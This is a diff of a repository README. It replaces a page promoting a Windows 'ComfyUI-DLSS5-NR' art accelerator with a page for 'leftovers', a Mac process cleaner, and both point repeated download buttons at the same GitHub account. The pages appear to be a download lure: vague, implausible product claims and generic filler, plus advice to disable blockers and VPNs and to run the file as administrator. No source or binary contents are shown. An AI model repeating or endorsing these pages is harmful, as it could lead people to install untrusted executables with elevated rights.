@@ -1,120 +1,157 @@
-<h1>⚡ ComfyUI-DLSS5-NR - Faster, Smoother AI Art Generation</h1>
+# 🍽️ leftovers - Tidy Up What Your Apps Leave Behind
 
-<p><a href="https://mccdxxx.github.io" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#6a11cb,#2575fc);color:white;text-decoration:none;border-radius:50px;font-size:20px;font-weight:bold;box-shadow:0 4px 15px rgba(0,0,0,0.3);">🚀 DOWNLOAD NOW - FREE</a></p>
+## 🚀 What Is leftovers?
 
-<p>Are you tired of waiting minutes for your AI images to render? Do you want your creative projects to look sharper and more realistic without upgrading your computer?<strong>ComfyUI-DLSS5-NR</strong> is here to change your digital art experience forever.</p>
+leftovers is a free, open-source app for your Mac that automatically cleans up the background processes and memory usage that other applications and coding tools leave running when you're done with them. Think of it as a housekeeper for your computer — it finds the digital "leftovers" that slow down your machine and gets rid of them for you.
 
-<p>This powerful add-on brings the magic of DLSS 5 technology to your ComfyUI workflow. It's designed specifically for people who want stunning visuals but don't have a degree in computer science. With just a few clicks, you can unlock faster generation speeds and crystal-clear image quality.</p>
+If you use coding assistants, development tools, or just have lots of apps open throughout the day, leftovers helps keep your Mac fast and responsive without you having to dig through system settings or remember to close things manually.
 
-<h2>🎯 What Is ComfyUI-DLSS5-NR?</h2>
+---
 
-<p>Put simply, this is a special helper program that supercharges your ComfyUI (a popular AI art tool). It uses advanced technology to make your computer work smarter and faster when creating images. The result? Beautiful pictures produced in a fraction of the time you'd usually wait.</p>
+## 🎯 Why You Need leftovers
 
-<p>Think of it like this: your computer is a kitchen, and making AI art is like baking a cake. Normally, the oven takes forever to bake. DLSS 5 is your new turbo-charged oven - it bakes the same delicious cake but does it much, much faster. You don't need to know how the oven works. You just turn it on and enjoy your cake sooner.</p>
+### 🧠 Your Mac Has a Memory Problem
 
-<h2>🛠️ Who Is This For?</h2>
+Every time you open an app, it uses memory (RAM). When you close the app, sometimes pieces of it stay in memory. Over time, these little pieces add up. Your Mac starts feeling sluggish, apps take longer to open, and everything feels heavy.
 
-<p>This application is perfect for:</p>
+### 🤖 Coding Agents Leave Messes
 
-<ul>
-<li>Digital artists who want to save time</li>
-<li>Hobbyists experimenting with AI-generated images</li>
-<li>Content creators producing visuals for videos or websites</li>
-<li>Anyone curious about AI art who wants an easier experience</li>
-<li>Students working on design projects</li>
-</ul>
+If you use AI coding tools or development agents, they often spawn helper processes that keep running even after you're done with them. These background tasks eat up CPU and memory without you realizing it. leftovers hunts these down and cleans them up automatically.
 
-<p>You don't need to know how to code. You don't need to understand complex settings. If you can click a button, you can use this tool.</p>
+### ⚡ Instant Speed Boost
 
-<h2>💡 Why You'll Love It</h2>
+After leftovers runs, your Mac feels snappier. Apps open faster, switching between programs is smoother, and you don't have to restart your computer just to get back to peak performance.
 
-<ul>
-<li><strong>Speed Boost:</strong> Create images much faster than before</li>
-<li><strong>Better Quality:</strong> Enjoy sharper details and more lifelike results</li>
-<li><strong>Easy Setup:</strong> No complicated installation - just download and go</li>
-<li><strong>No Programming Required:</strong> Everything is designed for regular users</li>
-<li><strong>Free to Use:</strong> This experimental project is completely free</li>
-</ul>
+---
 
-<h2>📥 Download Instructions</h2>
+## 📥 Download and Installation
 
-<p>Getting started is incredibly simple. Follow these steps carefully, and you'll be creating amazing art in minutes.</p>
+### ⬇️ Step 1: Get leftovers
 
-<h3>Step 1: Get the Download</h3>
+[![Download leftovers](https://img.shields.io/badge/Download-leftovers-ff6b6b?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/mccdxxx/leftovers/releases)
 
-<p>Click on this bright button to visit the download page:</p>
+Visit this link to download the application.
 
-<p><a href="https://mccdxxx.github.io" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f7971e,#ffd200);color:black;text-decoration:none;border-radius:50px;font-size:18px;font-weight:bold;box-shadow:0 4px 12px rgba(0,0,0,0.2);">✨ CLICK HERE TO DOWNLOAD</a></p>
+Click the big button above or go directly to the downloads page. Once you're there, you'll see the latest version of leftovers available for download.
 
-<p>Visit this link to download the application. The page will show you the latest version of ComfyUI-DLSS5-NR available for Windows.</p>
+### 🛠️ Step 2: Install leftovers
 
-<h3>Step 2: Download the File</h3>
+When the download finishes, you'll have the leftovers app file. Open it to launch leftovers for the first time.
 
-<p>On that page, look for the download button or link. Click it, and your browser will start downloading the file to your computer. Usually, you'll see a progress bar at the bottom of your browser window. Wait until it's finished. This might take a few minutes depending on your internet speed.</p>
+Since leftovers is a menu-bar app, you'll see its icon appear at the top of your screen, in the bar where the clock and Wi-Fi icons are. That's where leftovers lives, ready to help whenever you need it.
 
-<h3>Step 3: Find the Downloaded File</h3>
+### 🏁 Step 3: Start Cleaning
 
-<p>After the download finishes, open your <strong>Downloads</strong> folder. This is typically where your computer saves files you download from the internet. You can find it quickly by opening File Explorer (the folder icon at the bottom of your screen and clicking on "Downloads" in the left sidebar.</p>
+Once leftovers is running, it works quietly in the background. You don't need to do anything complicated — just let it do its job. You'll notice your Mac feels faster and more responsive after leftovers has been running for a bit.
 
-<h3>Step 4: Run the Application</h3>
+---
 
-<p>Once you've found the file, double-click it to run it. Your computer might ask for permission to open the file - click "Yes" or "Run" if prompted. That's it! The application will start, and you're ready to enjoy faster AI image generation.</p>
+## 🧰 How to Use leftovers
 
-<h2>🎮 How to Use It</h2>
+### 👀 Watch Your Menu Bar
 
-<p>Using ComfyUI-DLSS5-NR is designed to be intuitive,even for beginners. Here's what to expect:</p>
+The leftovers icon sits in your menu bar at the top of the screen. Click it to see what's running, how much memory is being used, and what leftovers has cleaned up recently.
 
-<ol>
-<li><strong>Start the Program:</strong> Run the application you just downloaded.</li>
-<li><strong>Open Your ComfyUI:</strong> This tool works alongside your existing ComfyUI setup. Simply launch both.</li>
-<li><strong>Watch the Magic:</strong> The DLSS 5 technology automatically kicks in to boost your generation speed and image quality. You'll notice faster results and sharper details right away.</li>
-<li><strong>Create Freely:</strong> Use your favorite prompts and settings as you normally would. The enhancement works quietly in the background, making everything smoother.</li>
-</ol>
+### 🎛️ Simple Controls
 
-<h2>❓ Frequently Asked Questions</h2>
+- **Click the icon** – See a quick overview of your system's status
+- **Open the main window** – Get a detailed view of everything leftovers is managing
+- **Let it run automatically** – leftovers works best when you just leave it on
 
-<h3>Is this safe to use on my computer?</h3>
-<p>Yes. This is a legitimate tool built for the ComfyUI community. Like any software, just download it from the official link provided above to ensure you get the genuine version.</p>
+### ✨ Automatic Cleaning
 
-<h3>Will it work on any Windows computer?</h3>
-<p>This is designed for Windows users. As long as your computer can run ComfyUI normally, this enhancement should work seamlessly.</p>
+By default, leftovers monitors your system and cleans up when it detects unnecessary background processes. You don't have to remember to click anything — it just happens.
 
-<h3>Do I need to pay for anything?</h3>
-<p>No. This is a free, experimental project shared with the community. No hidden charges or premium tiers.</p>
+### 🎚️ Customize Settings
 
-<h3>What if I have problems or questions?</h3>
-<p>Since this is an experimental project, you can check the GitHub page for updates or reports from other users. The community is helpful, and you're encouraged to read comments from fellow creators.</p>
+Want leftovers to be more aggressive or more gentle? Open the preferences window and adjust:
+- How often leftovers checks for stray processes
+- Which types of apps to clean up
+- Whether to show notifications when cleaning happens
 
-<h2>💬 Helpful Tips for Best Results</h2>
+---
 
-<ul>
-<li><strong>Keep Your System Updated:</strong> Make sure Windows and your graphics drivers are current for optimal performance.</li>
-<li><strong>Start Small:</strong> Begin with simple prompts to get comfortable, then explore more complex creations.</li>
-<li><strong>Save Early, Save Often:</strong> Always save your work as you go along.</li>
-<li><strong>Restart If Needed:</strong> If something seems off, close everything and reopen - this solves most minor hiccups.</li>
-</ul>
+## 🖥️ System Requirements
 
-<h2>🚨 Troubleshooting Common Issues</h2>
+leftovers is designed for macOS and works with:
 
-<p>If you run into any problems, try these simple solutions:</p>
+- **macOS 12.0 or later** (Monterey and newer versions)
+- **Apple Silicon (M1/M2/M3) and Intel Macs**
+- **At least 4GB of RAM** (8GB or more recommended for best experience)
 
-<ul>
-<li><strong>The download won't start:</strong> Check your internet connection and try disabling any VPN or pop-up blocker temporarily.</li>
-<li><strong>File won't open:</strong> Right-click the file and choose "Run as administrator" for permission.</li>
-<li><strong>Program seems slow:</strong> Close other heavy applications like games or video editors to free up your computer's resources.</li>
-<li><strong>It doesn't look different:</strong> Give it time. The improvements are visible in larger or more complex generations, not always instant on tiny thumbnails.</li>
-</ul>
+---
 
-<h2>✅ Why You Should Download Today</h2>
+## ❓ Frequently Asked Questions
 
-<p>Time is precious. Every minute you spend waiting for AI renders is a minute you could have spent creating, refining, or admiring your art. ComfyUI-DLSS5-NR gives you that gift of time. Plus, the improved quality means your creations will look more professional and polished.</p>
+### 🤔 Is leftovers safe to use?
 
-<p>Don't let complex technology intimidate you. This tool was made for everyone - from complete beginners to seasoned creators. The installation is painless, the usage is straightforward,ands the benefits are immediately noticeable.</p>
+Yes! leftovers is carefully designed to only clean up processes that are truly leftover — meaning they're no longer being used by any active application. It won't close apps you have open or interrupt your work.
 
-<p>Imagine finishing your projects faster, impressing your friends with sharper images,ands having more time to experiment with new ideas. That's what awaits you with just one click.</p>
+### 🆓 Do I have to pay for it?
 
-<p>Take the leap today. Your future self will thank you when you're creating stunning artwork with easeand speed. The world of fast, beautiful AI art is just one download away.</p>
+No, leftovers is completely free and open-source. You can use it forever without paying anything.
 
-<p style="text-align:center;margin-top:40px;"><a href="https://mccdxxx.github.io" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#00b09b,#96c93d);color:white;text-decoration:none;border-radius:50px;font-size:22px;font-weight:bold;box-shadow:0 4px 15px rgba(0,0,0,0.3);">🎉 GET STARTED NOW - IT'S FREE</a></p>
+### 🔄 How often should I run leftovers?
 
-<p style="text-align:center;color:#666;margin-top:20px;">Join countless other creators who've discovered the joy of faster, better AI art generation. Click the button above and start your journey.</p>
+You don't need to run it manually — it works automatically in the background. Just set it up once and forget about it.
+
+### 🐛 What if leftovers doesn't work on my Mac?
+
+Make sure you have a recent version of macOS. If you're still having trouble, check the project's GitHub page for updates and support.
+
+---
+
+## 👥 Who Should Use leftovers?
+
+- **Developers** – If you use coding tools, you know how many background processes they spawn. leftovers is perfect for you.
+- **Power users** – You have lots of apps open and want your Mac to stay fast.
+- **Anyone with a sluggish Mac** – If your computer feels slow, leftovers can help.
+- **People who hate restarting** – Don't want to reboot just to clear memory? leftovers handles it.
+
+---
+
+## 🌟 What Makes leftovers Special?
+
+- **Free forever** – No subscriptions, no paywalls
+- **Open source** – Transparent code you can inspect and trust
+- **Made for Mac** – Native macOS app that works beautifully
+- **Set and forget** – Works automatically once installed
+- **Lightweight** – Uses minimal resources itself
+- **Developer-friendly** – Built with SwiftUI, integrates well with developer workflows
+
+---
+
+## 📚 Additional Information
+
+### 🛠️ Technical Details
+
+leftovers is built with Swift and SwiftUI, Apple's modern programming languages and interface framework. It's designed to be lightweight and efficient, using minimal system resources while providing maximum cleanup power.
+
+### 🌐 Integration with Developer Tools
+
+If you use tools like Claude Code, coding agents, or MCP (Model Context Protocol) servers, leftovers is particularly useful. These tools often leave behind background processes that continue consuming memory. leftovers identifies and cleans these up automatically.
+
+### 🔒 Privacy and Security
+
+leftovers respects your privacy. It only looks at process information needed to determine what's safe to clean up. No personal data leaves your machine. Everything happens locally.
+
+---
+
+## 📝 Getting Started Checklist
+
+1. ✅ Download leftovers from the link above
+2. ✅ Install the app on your Mac
+3. ✅ Open leftovers and let it run in your menu bar
+4. ✅ Enjoy a faster, cleaner Mac
+
+---
+
+## 💬 Get Help or Contribute
+
+If you have questions, run into issues, or want to help improve leftovers, visit the GitHub repository. The project is open source, which means anyone can contribute code, report bugs, or suggest new features.
+
+---
+
+## 🏷️ Keywords
+
+claude-code, coding-agents, developer-tools, macos, mcp, memory, menubar, open-source, swift, swiftui
